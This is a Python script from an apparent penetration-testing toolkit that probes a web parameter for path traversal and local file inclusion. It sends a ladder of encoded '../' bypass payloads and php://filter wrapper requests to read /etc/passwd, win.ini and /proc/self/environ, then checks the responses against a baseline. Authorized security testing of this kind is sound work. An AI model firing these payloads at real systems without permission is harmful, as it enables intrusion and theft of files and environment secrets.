#!/usr/bin/env python3
"""traversal_probe.py — owned path-traversal / LFI DETECTION for pen_test.

Proves a real file READ, not a status wobble: it fires a depth-ladder of `../`
escapes in every common bypass encoding (URL, double-URL, overlong-UTF8,
`....//` strip-bypass, backslash) at canonical proof targets, and confirms the
target file's CONTENT SIGNATURE appears — while a bogus-path baseline does NOT.
That differential is what separates a leak from an app that returns the same
page for everything.

Signals:
  * OS files      — /etc/passwd (`root:.*:0:0:`), /etc/hostname, win.ini (`[fonts]`)
  * PHP wrappers  — php://filter base64-encode source disclosure (decode + match)
  * prefix/suffix — --prefix computes escape depth; --suffix appends + tries
                    null/`?`/`#` neutralization; base64 wrapper ignores suffixes

Benign and bounded: it reads a non-secret system file as proof and truncates it.
Log-poisoning / `expect://` / write-side traversal are referenced only (gated
behind --escalate awareness), never fired by default. See knowledge/backend_discovery.md.

AUTHORIZATION: active traffic — authorized targets only.

Usage:
    python3 traversal_probe.py -u "https://app/download?file=report.pdf" --param file
    python3 traversal_probe.py -u "https://app/img?path=a.png" --param path \\
        --prefix /var/www/uploads/ --suffix .png --evidence-dir ./ev
"""

from __future__ import annotations

import argparse
import base64
import json as jsonlib
import re

import _httpcore as core

# (label, path-without-leading-slash, content-signature regex, strong?)
TARGETS = [
    ("linux-passwd", "etc/passwd", re.compile(r"root:.*:0:0:"), True),
    ("linux-group", "etc/group", re.compile(r"root:x:0:"), True),
    ("win-ini", "windows/win.ini", re.compile(r"\[fonts\]|\[extensions\]|16-bit app support", re.I), True),
    ("linux-hostname", "etc/hostname", re.compile(r"^[a-zA-Z0-9][\w.-]{0,62}$", re.M), False),
    ("proc-environ", "proc/self/environ", re.compile(r"PATH=|HOSTNAME="), False),
]
# one `../` unit in each encoding family
SEPARATORS = [
    "../", "..\\", "%2e%2e%2f", "%2e%2e%5c", "..%2f", "%2e%2e/",
    "%252e%252e%252f", "%252e%252e%255c", "..%c0%af", "..%c1%9c",
    "..%255c", "....//", "....\\\\", "....\\/", "..\\/",
]
MAX_DEPTH = 12
B64_RE = re.compile(r"^[A-Za-z0-9+/=\r\n]{40,}$")


def _spec(args, param=None) -> core.RequestSpec:
    base_json = jsonlib.loads(args.json) if args.json else None
    base_form = dict(core.parse_kv(args.data.split("&"), "=")) if args.data else {}
    return core.RequestSpec(method=args.method, url=args.url, param=param or args.param,
                            location=args.location, base_form=base_form, base_json=base_json)


def _send(client, spec, payload):
    return client.request(**spec.build(payload, prefix_base=False))


def _payloads(target_path, prefix, suffix):
    """Yield candidate payloads for one target file."""
    # auto depth, or start near the prefix depth if supplied
    lo = 1
    hi = MAX_DEPTH
    if prefix:
        depth = len([p for p in prefix.split("/") if p])
        lo, hi = max(1, depth - 3), depth + 4
    seen = set()
    for sep in SEPARATORS:
        for n in range(lo, hi + 1):
            base = sep * n + target_path
            variants = [base]
            if suffix:
                variants += [base + "%00", base + "%23", base + "?", base + "#"]  # neutralize suffix
            for v in variants:
                if v not in seen:
                    seen.add(v)
                    yield sep, n, v
    # absolute-path attempt (no traversal) + PHP base64 wrapper source disclosure
    yield "absolute", 0, "/" + target_path
    yield "php-filter", 0, f"php://filter/convert.base64-encode/resource=/{target_path}"


def _b64_leak(text, sig) -> str | None:
    cand = text.strip()
    if not B64_RE.match(cand):
        return None
    try:
        decoded = base64.b64decode(cand, validate=False).decode("utf-8", "replace")
    except Exception:
        return None
    return decoded if sig.search(decoded) else None


def hunt(client, spec, prefix, suffix) -> tuple[dict, str] | None:
    # baseline: a bogus filename must NOT match any target signature
    bogus = _send(client, spec, "qxT7_nonexistent_9f3a.zzz")
    print(f"  baseline(bogus path) status={bogus.status} len={bogus.length}")

    for label, tpath, sig, strong in TARGETS:
        print(f"\n[target] {label} ({tpath}) — signature /{sig.pattern[:40]}/")
        for sep, n, payload in _payloads(tpath, prefix, suffix):
            r = _send(client, spec, payload)
            if not r.ok:
                continue
            hit_direct = bool(sig.search(r.text)) and not sig.search(bogus.text or "")
            b64 = _b64_leak(r.text, sig) if sep == "php-filter" else None
            if hit_direct or b64:
                content = b64 or r.text
                m = sig.search(content)
                excerpt = content[max(0, m.start() - 20):m.start() + 200].replace("\n", " ") if m else content[:200]
                how = "php://filter base64 source read" if b64 else f"{sep} x{n}"
                # weak targets need corroboration: require the strong regex OR a b64 decode
                if not strong and not b64:
                    print(f"  [?] weak-signal match ({label}) via {how} — needs a strong target too; noting.")
                    continue
                print(f"  [!] FILE READ CONFIRMED: {label} via {how}")
                return {"label": label, "tpath": tpath, "payload": payload, "how": how}, excerpt
        print(f"  no confirmed read for {label}")
    return None


def main() -> None:
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("-u", "--url", required=True)
    p.add_argument("--param", required=True)
    p.add_argument("--location", default="query", choices=core.LOCATIONS)
    p.add_argument("-X", "--method", default="GET")
    p.add_argument("--data")
    p.add_argument("--json")
    p.add_argument("--prefix", help="known/guessed base dir the app prepends (tunes escape depth)")
    p.add_argument("--suffix", help="extension the app appends, e.g. .png (tries null/?/# bypass)")
    core.add_common_args(p)
    core.add_evidence_args(p)
    args = p.parse_args()
    core.require_scheme(args.url)

    client = core.client_from_args(args)
    spec = _spec(args)
    ev = core.evidence_from_args(args)
    print(f"Target: {args.method} {args.url}  |  injecting `{args.param}` in {args.location}")

    result = hunt(client, spec, args.prefix, args.suffix)
    print("\n" + "=" * 60)
    if not result:
        print("[-] No confirmed file read. Try other params/locations, a known --prefix/--suffix, "
              "or a file-download/static-asset endpoint (the modern high-yield sink).")
        return

    info, excerpt = result
    proof = (f"read {info['tpath']} via {info['how']} (payload {info['payload']!r}); "
             f"content signature matched and the bogus-path baseline did not — real file read.")
    print(f"[!] Path traversal / LFI — {info['label']} — payload {info['payload']!r}")
    print("    Escalation (source/config disclosure, LFI->RCE via wrappers/log-poisoning) is "
          "referenced only — see knowledge/backend_discovery.md and rce.md; not fired here.")

    if ev:
        repro = (f"python3 traversal_probe.py -u '{args.url}' --param {args.param} "
                 f"--location {args.location} -X {args.method}"
                 + (f" --prefix {args.prefix}" if args.prefix else "")
                 + (f" --suffix {args.suffix}" if args.suffix else ""))
        f = core.Finding(
            vuln_class="path-traversal", tool="traversal_probe.py",
            title=f"Path traversal / LFI in {args.param} (read {info['tpath']})",
            severity="high", target=args.url, status="confirmed",
            param=args.param, location=args.location, proof=proof,
            request=f"{args.method} {args.url}  [{args.location}:{args.param}]={info['payload']}",
            response_excerpt=excerpt, reproduce=repro,
            notes="Proof read a non-secret system file, bounded/redacted. Escalation to source "
                  "disclosure or RCE not fired by this detector.")
        ev.add(f)
        print(f"[evidence] finding written to {ev.findings_path}")


if __name__ == "__main__":
    main()
